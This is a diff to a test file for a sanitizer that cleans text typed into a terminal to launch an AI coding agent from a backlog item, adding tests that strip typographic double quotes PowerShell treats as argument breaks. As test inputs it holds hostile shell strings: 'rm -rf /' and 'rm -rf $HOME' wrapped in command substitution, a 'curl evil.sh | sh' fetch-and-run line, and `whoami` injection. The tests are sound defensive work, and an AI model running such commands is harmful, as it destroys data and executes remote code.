@@ -77,6 +77,15 @@ describe("sanitizeForTypedLine", () => {
     expect(sanitizeForTypedLine("C:\\Users\\eric", 200)).toBe("C:Userseric");
   });
 
+  it("drops TYPOGRAPHIC double quotes (PowerShell 5.1 tokenizes U+201C-201F as a double quote) and keeps the single-quote family", () => {
+    // Measured 2026-09-01: `"… “look into duckdb”. …"` reached claude as four arguments.
+    const smart = sanitizeForTypedLine("say “hi” and „low‟ then ‘it’s’ ‚x‛", 200);
+    expect(smart).not.toMatch(/[\u201C-\u201F]/);
+    expect(smart).toBe("say hi and low then ‘it’s’ ‚x‛");
+    // Straight single quotes are literal inside a double-quoted argument and survive too.
+    expect(sanitizeForTypedLine("it's 'fine'", 200)).toBe("it's 'fine'");
+  });
+
   it("defuses command substitution — no $ and no backtick survive", () => {
     expect(sanitizeForTypedLine("$(rm -rf /)", 200)).toBe("(rm -rf /)");
     expect(sanitizeForTypedLine("`curl evil.sh | sh`", 200)).toBe("curl evil.sh | sh");
@@ -574,7 +583,7 @@ describe("backlog item spawn context (SWIT-64)", () => {
   it("stands ALONE when the tab has no panel, names the id, frames the text, points at the tool", () => {
     const line = buildSpawnContext(null, 0, { backlogItem: ITEM });
     expect(line).toBe(
-      "You were opened from backlog item bmf1x2a01: “look at duckdb for the tennis table”. Start there. " +
+      "You were opened from backlog item bmf1x2a01: 'look at duckdb for the tennis table'. Start there. " +
         "If you create a ticket or a spec for it, record it with the backlog tool (op link, itemId bmf1x2a01)."
     );
     expect(buildBacklogItemLine(ITEM)).toBe(line);
@@ -594,14 +603,18 @@ describe("backlog item spawn context (SWIT-64)", () => {
       backlogItem: { id: "x1", text: 'rm -rf "$HOME"\n`whoami` %PATH% \\ ok' },
     }) as string;
     expect(line).not.toMatch(/["\\$%`\n\r]/);
-    expect(line).toContain("“rm -rf HOME whoami PATH ok”");
+    expect(line).toContain("'rm -rf HOME whoami PATH ok'");
+    // Smart quotes in the item text cannot re-open the split: they are gone.
+    const smart = buildSpawnContext(null, 0, { backlogItem: { id: "x2", text: "“look into duckdb”" } }) as string;
+    expect(smart).toContain("x2: 'look into duckdb'. Start there.");
+    expect(smart).not.toMatch(/[“-‟]/);
     // An id that is not id-alphabet is dropped, and with it the sentence —
     // a link instruction naming a fake id would send the agent nowhere.
     expect(buildSpawnContext(null, 0, { backlogItem: { id: "../x y", text: "t" } })).toBeNull();
     expect(buildSpawnContext(null, 0, { backlogItem: { id: "ok", text: "   " } })).toBeNull();
     // Long text is capped by code point with an ellipsis; the tool clause survives.
     const long = buildSpawnContext(null, 0, { backlogItem: { id: "ok", text: "é".repeat(2000) } }) as string;
-    expect(long).toContain("…”. Start there.");
+    expect(long).toContain("…'. Start there.");
     expect(long).toContain("(op link, itemId ok)");
     expect(Array.from(long).length).toBeLessThanOrEqual(SPAWN_CONTEXT_MAX);
   });
